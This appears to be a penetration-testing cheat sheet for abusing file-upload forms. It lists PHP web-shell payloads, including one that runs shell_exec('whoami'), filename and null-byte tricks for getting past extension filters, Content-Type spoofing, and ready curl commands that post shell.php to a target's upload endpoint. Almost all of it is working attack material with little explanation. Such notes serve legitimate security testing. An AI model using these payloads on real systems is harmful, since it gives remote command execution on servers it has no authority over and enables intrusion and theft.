- Payload:
  - Test if the code was executed
    ```php
    <?php echo "UPLOAD_OK"; ?>
    ```
  - If executed,
    ```php
    <?php echo shell_exec('whoami'); ?>
    ```
- Bypass techniques:
  - Change `shell.php` to `shell.php.jpg`
  - Content-Type spoofing: `curl -F "file=@shell.php;type=image/jpeg"`
    > Change "file" if needed
  - NULL BYTE and Weird suffixes: `shell.php;.jpg`, `shell.php%20`, `shell.php%00.jpg`
- curl example:
  ```bash
  curl -i -X POST -F "file=@shell.php;type=application/x-php" https://target/upload
  curl -i -X POST -F "file=@shell.php;type=image/jpeg" https://target/upload
  # Change "file" if needed.
  ```
